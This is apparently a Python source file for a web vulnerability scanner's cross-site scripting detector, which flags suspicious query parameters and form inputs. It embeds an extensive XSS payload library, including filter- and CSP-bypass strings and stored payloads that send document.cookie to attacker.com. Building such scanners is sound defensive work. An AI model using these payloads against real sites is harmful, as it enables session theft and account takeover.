from urllib.parse import parse_qsl, urlparse

from app.core.detectors.base_detector import BaseDetector, Finding
from app.models.vulnerability import OwaspCategory, SeverityLevel
from app.utils.payloads import payload_manager


class XSSDetector(BaseDetector):
    name = "xss"

    # ---------------------------------------------------------------------------
    # Parameter name heuristics
    # ---------------------------------------------------------------------------

    reflective_param_names = {
        # Search / query
        "q", "query", "search", "s", "keyword", "keywords", "term", "terms",
        "find", "lookup", "filter", "input",
        # User content
        "comment", "message", "msg", "note", "notes", "body",
        "text", "content", "description", "summary", "bio", "about",
        "title", "subject", "heading", "caption", "label",
        "feedback", "review", "reply", "post", "answer", "question",
        "announcement", "bulletin", "status", "tweet", "update",
        # Identity
        "name", "fullname", "full_name", "firstname", "first_name",
        "lastname", "last_name", "username", "uname", "nickname",
        "displayname", "display_name", "alias",
        "email", "mail", "e_mail",
        "company", "org", "organization",
        "address", "city", "state", "country",
        "phone", "telephone", "mobile",
        # Navigation / redirect
        "return", "next", "redirect", "redirect_to", "redirect_url",
        "return_to", "return_url", "goto", "go", "continue",
        "url", "link", "href", "src", "source", "target", "dest",
        "destination", "back", "forward",
        "ref", "referral", "referrer", "from",
        # Page / layout
        "page", "view", "template", "layout", "theme", "format",
        "lang", "language", "locale",
        # Auth / misc
        "token", "code", "key", "error", "reason", "info",
        "callback", "jsonp", "cb",
        "data", "value", "val", "param",
        "output", "out", "result", "response",
        "tag", "tags", "category", "cat",
    }

    # Substring tokens for name-based matching
    _reflective_tokens = (
        "q", "search", "query", "keyword", "redirect", "return", "next",
        "url", "link", "href", "src", "name", "email", "text", "content",
        "title", "comment", "message", "input", "data", "value", "tag",
        "ref", "callback", "jsonp", "output", "error", "param",
    )

    # ---------------------------------------------------------------------------
    # Value-content heuristics — things already in the param value
    # ---------------------------------------------------------------------------

    _suspicious_value_tokens = (
        # Script tags
        "<script", "</script", "<script>",
        # Event handlers (on*)
        "onerror", "onload", "onclick", "onmouseover", "onmouseout",
        "onfocus", "onblur", "onchange", "onsubmit", "onreset",
        "onkeydown", "onkeyup", "onkeypress",
        "ondblclick", "oncontextmenu", "ondrag", "ondrop",
        "onanimationstart", "onanimationend",
        "ontransitionend", "onpointerdown", "onpointerup",
        # JavaScript URIs
        "javascript:", "vbscript:", "data:text/html", "data:application/",
        # HTML injection vectors
        "<img", "<iframe", "<frame", "<embed", "<object",
        "<svg", "<math", "<details", "<video", "<audio",
        "<input", "<form", "<button", "<a href",
        "<body", "<html", "<base",
        "<link ", "<meta",
        # CSS injection
        "expression(", "url(javascript", "behavior:",
        "binding:", "-moz-binding:",
        # Template injection markers (may lead to XSS)
        "{{", "}}", "${", "#{", "<%", "%>",
        # Encoded variants (partial)
        "&lt;script", "&#60;script", "\\u003cscript",
        "%3cscript", "%3Cscript",
    )

    # ---------------------------------------------------------------------------
    # Payload library
    # ---------------------------------------------------------------------------

    # Classic reflected payloads
    _reflected_payloads = [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        "<script>alert('XSS')</script>",
        '<script>confirm(1)</script>',
        '<script>prompt(1)</script>',
        '<script>console.log(document.cookie)</script>',
        # Case / whitespace variants
        '<Script>alert(1)</Script>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<script >alert(1)</script >',
        '<script\t>alert(1)</script>',
        '<script\n>alert(1)</script>',
        # Broken / partial tags (parser differential)
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<<script>alert(1)</script>',
        '</script><script>alert(1)</script>',
        # Null-byte injection
        '<scri\x00pt>alert(1)</scri\x00pt>',
    ]

    # Event-handler / attribute injection payloads
    _event_payloads = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onload="alert(1)',
        "' onload='alert(1)'",
        '" onerror="alert(1)',
        "' onerror='alert(1)'",
        '" onclick="alert(1)',
        "' onclick='alert(1)'",
        '" onkeyup="alert(1)',
        '" onchange="alert(1)',
        '" onblur="alert(1)',
        # Polyglots with break-out
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "'><svg onload=alert(1)>",
        '"><details open ontoggle=alert(1)>',
        # Without quotes
        ' onmouseover=alert(1) ',
        '/onmouseover=alert(1)',
    ]

    # HTML tag injection payloads
    _html_payloads = [
        '<img src=x onerror=alert(1)>',
        '<img src="x" onerror="alert(1)">',
        "<img src='x' onerror='alert(1)'>",
        '<img src=1 onerror=alert(document.cookie)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<svg onload="alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<iframe onload=alert(1)></iframe>',
        '<body onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
        '<keygen autofocus onfocus=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<math><mtext></p><img src=x onerror=alert(1)></mtext></math>',
        '<table background="javascript:alert(1)">',
        '<div style="background:url(javascript:alert(1))">',
    ]

    # JavaScript URI payloads (for href/src/redirect params)
    _javascript_uri_payloads = [
        'javascript:alert(1)',
        'javascript:alert("XSS")',
        "javascript:alert('XSS')",
        'javascript:confirm(1)',
        'javascript:prompt(1)',
        'javascript://comment%0aalert(1)',
        'javascript:void(alert(1))',
        'javascript://%0dalert(1)',
        # vbscript (IE legacy, still flagged)
        'vbscript:msgbox(1)',
        # Data URIs
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data:application/x-javascript,alert(1)',
    ]

    # DOM-based / sink-targeting payloads
    _dom_payloads = [
        # Hash/fragment sinks
        '#<script>alert(1)</script>',
        '#"><img src=x onerror=alert(1)>',
        '#javascript:alert(1)',
        # document.write / innerHTML sinks
        '";document.write("<script>alert(1)</script>");//',
        "';document.write('<script>alert(1)</script>');// ",
        '";document.body.innerHTML="<script>alert(1)</script>";//',
        # postMessage / eval sinks
        '");eval("alert(1)");//',
        "');eval('alert(1)');//",
        # location sinks
        '";location="javascript:alert(1)";//',
        # jQuery sinks
        '");$("body").html("<script>alert(1)</script>");//',
        # Angular template injection
        '{{constructor.constructor("alert(1)")()}}',
        '{{7*7}}',
        # Vue template injection
        '${alert(1)}',
    ]

    # Stored XSS payloads (designed to survive DB round-trips)
    _stored_payloads = [
        '<script>alert(document.cookie)</script>',
        '<script>fetch("https://attacker.com/?c="+document.cookie)</script>',
        '<script>new Image().src="https://attacker.com/?c="+document.cookie</script>',
        '<img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">',
        '<svg onload="fetch(\'https://attacker.com/?c=\'+document.cookie)">',
        # Persistent polyglot
        '"><script>document.location="https://attacker.com/?c="+document.cookie</script>',
        # Delayed execution
        '<script>setTimeout(function(){alert(document.cookie)},1000)</script>',
    ]

    # WAF / filter bypass payloads
    _bypass_payloads = [
        # URL encoding
        '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
        # Double URL encoding
        '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
        # HTML entity encoding
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        # Unicode escapes
        '\u003cscript\u003ealert(1)\u003c/script\u003e',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        # Null bytes
        '<scri\x00pt>alert(1)</scri\x00pt>',
        '<scri%00pt>alert(1)</scri%00pt>',
        # Comment injection
        '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
        '<s%00c%00r%00i%00p%00t>alert(1)</s%00c%00r%00i%00p%00t>',
        # Mixed case
        '<ScRiPt>alert(1)</ScRiPt>',
        '<IMG SRC=x OnErRoR=alert(1)>',
        # Backtick attribute delimiters
        '<img src=`x` onerror=`alert(1)`>',
        # SVG without space
        '<svg/onload=alert(1)>',
        '<svg\nonload=alert(1)>',
        '<svg\tonload=alert(1)>',
        # CSS expression (IE)
        '<div style="width:expression(alert(1))">',
        '<style>body{background:url("javascript:alert(1)")}</style>',
        # Polyglot
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',
        # JSON-escaped
        '{"xss":"<script>alert(1)</script>"}',
    ]

    # JSONP / callback injection payloads
    _jsonp_payloads = [
        'alert(1)//',
        'alert(1);//',
        ')}alert(1)//',
        ');alert(1)//',
        'alert(document.cookie)//',
        '1;alert(1)//',
        'jQuery_alert_1',
    ]

    # CSP bypass payloads
    _csp_bypass_payloads = [
        # Nonce prediction / unsafe-inline
        '<script nonce="">alert(1)</script>',
        # JSONP-based CSP bypass (common CDN endpoints)
        '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
        '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script><div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>',
        # base tag hijack
        '<base href="https://attacker.com/">',
        # meta refresh
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        # Link prefetch / modulepreload
        '<link rel="modulepreload" href="javascript:alert(1)">',
    ]

    # Mutation XSS (mXSS) payloads — survive innerHTML/sanitizer round-trips
    _mutation_payloads = [
        '<listing><img src=x onerror=alert(1)></listing>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<svg><![CDATA[</svg><script>alert(1)</script>]]>',
        '<xmp><img src=x onerror=alert(1)></xmp>',
        '<plaintext><img src=x onerror=alert(1)>',
        '<!--[if]><script>alert(1)</script-->',
        '<!--[if IE]><img src=x onerror=alert(1)><![endif]-->',
        '<![CDATA[<script>alert(1)</script>]]>',
        '<style><img src=x onerror=alert(1)></style>',
    ]

    # ---------------------------------------------------------------------------
    # Internal helpers
    # ---------------------------------------------------------------------------

    def _all_xss_payloads(self) -> list[str]:
        return (
            self._reflected_payloads
            + self._event_payloads
            + self._html_payloads
            + self._javascript_uri_payloads
            + self._dom_payloads
            + self._stored_payloads
            + self._bypass_payloads
            + self._jsonp_payloads
            + self._csp_bypass_payloads
            + self._mutation_payloads
        )

    def _param_is_reflective(self, name: str) -> bool:
        lowered = name.lower()
        return lowered in self.reflective_param_names or any(
            tok in lowered for tok in self._reflective_tokens
        )

    def _param_is_redirect(self, name: str) -> bool:
        lowered = name.lower()
        return any(
            tok in lowered
            for tok in ("redirect", "return", "next", "goto", "url", "link",
                        "href", "src", "dest", "target", "callback", "cb", "jsonp")
        )

    def _param_is_jsonp(self, name: str) -> bool:
        return name.lower() in ("callback", "cb", "jsonp", "json_callback", "jsoncallback")

    def _value_has_xss(self, value: str) -> bool:
        lowered = value.lower()
        return any(tok in lowered for tok in self._suspicious_value_tokens)

    def _value_is_reflected_html(self, value: str) -> bool:
        """Value looks like it would land inside an HTML context."""
        return "<" in value or ">" in value or "&" in value

    def _value_is_uri(self, value: str) -> bool:
        lowered = value.lower()
        return any(lowered.startswith(s) for s in (
            "http://", "https://", "//", "javascript:", "vbscript:",
            "data:", "ftp://", "file://",
        ))

    # ---------------------------------------------------------------------------
    # Finding factories
    # ---------------------------------------------------------------------------

    def _xss_finding(
        self,
        vuln_type: str,
        url: str,
        parameter: str,
        payload: str,
        evidence: str,
        severity: SeverityLevel = SeverityLevel.high,
        method: str | None = None,
    ) -> Finding:
        kwargs: dict = dict(
            category=OwaspCategory.a03,
            vuln_type=vuln_type,
            severity=severity,
            url=url,
            parameter=parameter,
            payload=payload,
            evidence=evidence,
        )
        if method is not None:
            kwargs["method"] = method
        return Finding(**kwargs)

    # ---------------------------------------------------------------------------
    # Main detect method
    # ---------------------------------------------------------------------------

    async def detect(self, urls: list[str], forms: list[object], **kwargs: object) -> list[Finding]:
        findings: list[Finding] = []

        # Merge with payload_manager; our built-ins take priority.
        mgr_xss = payload_manager.get_payloads("xss") or []
        all_payloads = self._all_xss_payloads() + [p for p in mgr_xss if p not in self._all_xss_payloads()]

        p_reflected  = all_payloads[0]   # classic <script> tag
        p_event      = self._event_payloads[0]
        p_html       = self._html_payloads[0]
        p_uri        = self._javascript_uri_payloads[0]
        p_dom        = self._dom_payloads[0]
        p_stored     = self._stored_payloads[0]
        p_bypass     = self._bypass_payloads[0]
        p_jsonp      = self._jsonp_payloads[0]
        p_csp        = self._csp_bypass_payloads[0]
        p_mutation   = self._mutation_payloads[0]

        # -----------------------------------------------------------------------
        # URL parameter analysis
        # -----------------------------------------------------------------------
        for url in urls:
            parsed = urlparse(url)
            query_params = parse_qsl(parsed.query, keep_blank_values=True)

            # Fragment-based DOM XSS hint (no server round-trip needed)
            if parsed.fragment:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential DOM-Based XSS via URL Fragment",
                        url=url,
                        parameter="#fragment",
                        payload=self._dom_payloads[0],
                        evidence=(
                            "URL fragment is present; client-side code that reads location.hash "
                            "and writes to the DOM without sanitisation is a DOM XSS vector."
                        ),
                        severity=SeverityLevel.medium,
                    )
                )

            for param_name, param_value in query_params:

                # 1. Name-based reflected XSS hint
                if self._param_is_reflective(param_name):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential Reflected XSS in Query Parameter",
                            url=url,
                            parameter=param_name,
                            payload=p_reflected,
                            evidence=(
                                f"Parameter '{param_name}' is commonly reflected in responses; "
                                "test with script injection payloads."
                            ),
                            severity=SeverityLevel.medium,
                        )
                    )

                # 2. Redirect / open-redirect → JavaScript URI XSS
                if self._param_is_redirect(param_name):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential Open Redirect / JavaScript URI XSS",
                            url=url,
                            parameter=param_name,
                            payload=p_uri,
                            evidence=(
                                f"Parameter '{param_name}' controls navigation destinations; "
                                "a javascript: or data: URI can execute arbitrary script."
                            ),
                            severity=SeverityLevel.high,
                        )
                    )

                # 3. JSONP callback injection
                if self._param_is_jsonp(param_name):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential JSONP Callback XSS",
                            url=url,
                            parameter=param_name,
                            payload=p_jsonp,
                            evidence=(
                                f"Parameter '{param_name}' looks like a JSONP callback; "
                                "injecting script into the callback name executes on the caller."
                            ),
                            severity=SeverityLevel.high,
                        )
                    )

                # 4. Value already contains XSS markers (reflected / stored)
                if self._value_has_xss(param_value):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential Reflected/Stored XSS — Suspicious Value",
                            url=url,
                            parameter=param_name,
                            payload=p_html,
                            evidence=(
                                f"Parameter '{param_name}' value contains HTML/JS markers; "
                                "server may already be echoing unsanitised input."
                            ),
                            severity=SeverityLevel.critical,
                        )
                    )

                # 5. Value is a URI — potential open-redirect + JS URI XSS
                if self._value_is_uri(param_value):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential Open Redirect / JavaScript URI XSS",
                            url=url,
                            parameter=param_name,
                            payload=p_uri,
                            evidence=(
                                f"Parameter '{param_name}' value is a URI; "
                                "a javascript:/vbscript:/data: scheme can execute script."
                            ),
                            severity=SeverityLevel.high,
                        )
                    )

                # 6. Value contains raw HTML-like content → mXSS / innerHTML risk
                if self._value_is_reflected_html(param_value) and not self._value_has_xss(param_value):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential HTML Injection / Mutation XSS",
                            url=url,
                            parameter=param_name,
                            payload=p_mutation,
                            evidence=(
                                f"Parameter '{param_name}' value contains angle brackets or "
                                "HTML entities; test with mutation-XSS and HTML-injection payloads."
                            ),
                            severity=SeverityLevel.medium,
                        )
                    )

                # 7. WAF-bypass hint — encoded characters in value
                if "%" in param_value or "\\u" in param_value or "&#" in param_value:
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential XSS via Encoding Bypass",
                            url=url,
                            parameter=param_name,
                            payload=p_bypass,
                            evidence=(
                                f"Parameter '{param_name}' value contains URL/Unicode/HTML "
                                "encoding that may bypass input filters."
                            ),
                            severity=SeverityLevel.medium,
                        )
                    )

                # 8. Template injection hint → may chain to XSS
                if any(tok in param_value for tok in ("{{", "}}", "${", "#{", "<%")):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential Client-Side Template Injection (CSTI → XSS)",
                            url=url,
                            parameter=param_name,
                            payload=self._dom_payloads[-2],   # Angular CSTI payload
                            evidence=(
                                f"Parameter '{param_name}' value contains template expression "
                                "delimiters; Angular/Vue/React CSTI may evaluate to XSS."
                            ),
                            severity=SeverityLevel.high,
                        )
                    )

                # 9. DOM sink hint — params likely read by client-side JS
                if param_name.lower() in ("data", "val", "value", "output", "result",
                                          "html", "inner", "content", "text"):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential DOM-Based XSS via JS-Read Parameter",
                            url=url,
                            parameter=param_name,
                            payload=p_dom,
                            evidence=(
                                f"Parameter '{param_name}' name suggests it may be read by "
                                "client-side JavaScript and inserted into the DOM unsanitised."
                            ),
                            severity=SeverityLevel.medium,
                        )
                    )

                # 10. CSP bypass hint — src/href params that accept external URLs
                if param_name.lower() in ("src", "href", "script", "js", "css",
                                          "stylesheet", "resource", "asset"):
                    findings.append(
                        self._xss_finding(
                            vuln_type="Potential CSP Bypass / Script Injection via Resource URL",
                            url=url,
                            parameter=param_name,
                            payload=p_csp,
                            evidence=(
                                f"Parameter '{param_name}' controls a resource URL that the page "
                                "loads; an attacker-controlled URL bypasses CSP and loads script."
                            ),
                            severity=SeverityLevel.critical,
                        )
                    )

        # -----------------------------------------------------------------------
        # Form analysis
        # -----------------------------------------------------------------------
        for form in forms:
            raw_inputs = list(getattr(form, "inputs", []))
            if not raw_inputs:
                continue

            form_url    = getattr(form, "action", getattr(form, "page_url", ""))
            form_method = getattr(form, "method", "POST")

            input_map   = {i.name.lower(): i for i in raw_inputs}   # lower → input obj
            input_types = {getattr(i, "input_type", "text").lower() for i in raw_inputs}

            # Helper: first matching input's original name
            def _first_name(names_lower: set[str]) -> str:
                for lo in sorted(names_lower):
                    if lo in input_map:
                        return input_map[lo].name
                return sorted(names_lower)[0]

            # ---- 1. Reflective / stored XSS via name-matched inputs ----
            reflective_hits = {lo for lo in input_map if self._param_is_reflective(lo)}
            text_type_hits  = input_types.intersection(
                {"text", "search", "url", "email", "textarea", "tel", "number", "hidden"}
            )

            if reflective_hits or text_type_hits:
                param = _first_name(reflective_hits) if reflective_hits else sorted(input_map.keys())[0]
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential Reflected/Stored XSS via Form Input",
                        url=form_url,
                        parameter=param,
                        payload=p_reflected,
                        evidence=(
                            f"Form input(s) {sorted(reflective_hits or set(input_map.keys()))} "
                            "accept user text and may reflect or store it unsanitised."
                        ),
                        method=form_method,
                    )
                )

            # ---- 2. Event-handler injection via text inputs ----
            if text_type_hits:
                param = _first_name(reflective_hits) if reflective_hits else sorted(input_map.keys())[0]
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential Attribute/Event-Handler Injection via Form",
                        url=form_url,
                        parameter=param,
                        payload=p_event,
                        evidence=(
                            "Form text inputs may land inside HTML attribute contexts; "
                            "event-handler breakout payloads (e.g. \" onmouseover=) should be tested."
                        ),
                        method=form_method,
                    )
                )

            # ---- 3. Open-redirect / JavaScript URI via URL/redirect inputs ----
            redirect_hits = {lo for lo in input_map if self._param_is_redirect(lo)}
            if redirect_hits:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential Open Redirect / JavaScript URI XSS via Form",
                        url=form_url,
                        parameter=_first_name(redirect_hits),
                        payload=p_uri,
                        evidence=(
                            f"Form input(s) {sorted(redirect_hits)} control navigation destinations; "
                            "a javascript: URI can execute script when the redirect is followed."
                        ),
                        severity=SeverityLevel.high,
                        method=form_method,
                    )
                )

            # ---- 4. JSONP callback inputs ----
            jsonp_hits = {lo for lo in input_map if self._param_is_jsonp(lo)}
            if jsonp_hits:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential JSONP Callback XSS via Form",
                        url=form_url,
                        parameter=_first_name(jsonp_hits),
                        payload=p_jsonp,
                        evidence=(
                            f"Form input(s) {sorted(jsonp_hits)} appear to be JSONP callbacks; "
                            "injecting script in the callback name causes execution."
                        ),
                        severity=SeverityLevel.high,
                        method=form_method,
                    )
                )

            # ---- 5. Stored XSS via textarea / rich-text / comment fields ----
            stored_hits = {
                lo for lo in input_map
                if lo in ("comment", "message", "body", "content", "text",
                          "description", "review", "feedback", "note", "notes",
                          "bio", "about", "post", "reply", "answer")
                or getattr(input_map[lo], "input_type", "text").lower() == "textarea"
            }
            if stored_hits:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential Stored XSS via Rich-Text / Comment Input",
                        url=form_url,
                        parameter=_first_name(stored_hits),
                        payload=p_stored,
                        evidence=(
                            f"Form input(s) {sorted(stored_hits)} are long-form text fields "
                            "likely persisted to a database; stored XSS payloads should be tested."
                        ),
                        severity=SeverityLevel.critical,
                        method=form_method,
                    )
                )

            # ---- 6. Hidden inputs → second-order / DOM XSS ----
            hidden_hits = [i.name for i in raw_inputs if getattr(i, "input_type", "") == "hidden"]
            if hidden_hits:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential Second-Order / DOM XSS via Hidden Input",
                        url=form_url,
                        parameter=hidden_hits[0],
                        payload=p_dom,
                        evidence=(
                            f"Hidden input(s) {hidden_hits} may be written into the DOM by "
                            "client-side JavaScript or stored for later rendering."
                        ),
                        severity=SeverityLevel.medium,
                        method=form_method,
                    )
                )

            # ---- 7. File-upload fields → stored XSS via SVG / HTML upload ----
            file_hits = [i.name for i in raw_inputs if getattr(i, "input_type", "") == "file"]
            if file_hits:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential Stored XSS via Malicious File Upload",
                        url=form_url,
                        parameter=file_hits[0],
                        payload='<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
                        evidence=(
                            f"File upload input(s) {file_hits} may accept SVG or HTML files "
                            "that execute script when served from the same origin."
                        ),
                        severity=SeverityLevel.critical,
                        method=form_method,
                    )
                )

            # ---- 8. WAF-bypass hint for any form with text inputs ----
            if text_type_hits:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential XSS via Encoding/Filter Bypass",
                        url=form_url,
                        parameter=_first_name(reflective_hits) if reflective_hits else sorted(input_map.keys())[0],
                        payload=p_bypass,
                        evidence=(
                            "Form accepts text input; WAF/filter bypass payloads "
                            "(URL encoding, HTML entities, null bytes) should also be tested."
                        ),
                        severity=SeverityLevel.medium,
                        method=form_method,
                    )
                )

            # ---- 9. Mutation XSS hint for forms with rich-text / contenteditable ----
            if stored_hits or "textarea" in input_types:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential Mutation XSS (mXSS) via Rich-Text Input",
                        url=form_url,
                        parameter=_first_name(stored_hits) if stored_hits else sorted(input_map.keys())[0],
                        payload=p_mutation,
                        evidence=(
                            "Long-form inputs that pass through an HTML sanitiser are susceptible "
                            "to mutation XSS payloads that are rewritten into executable form."
                        ),
                        severity=SeverityLevel.high,
                        method=form_method,
                    )
                )

            # ---- 10. CSP bypass hint for forms that load external resources ----
            resource_hits = {lo for lo in input_map if lo in ("src", "href", "stylesheet",
                                                               "script", "resource", "asset")}
            if resource_hits:
                findings.append(
                    self._xss_finding(
                        vuln_type="Potential CSP Bypass via Controllable Resource URL",
                        url=form_url,
                        parameter=_first_name(resource_hits),
                        payload=p_csp,
                        evidence=(
                            f"Form input(s) {sorted(resource_hits)} control URLs of resources "
                            "loaded by the page; an attacker-supplied URL may bypass CSP."
                        ),
                        severity=SeverityLevel.critical,
                        method=form_method,
                    )
                )

        return findings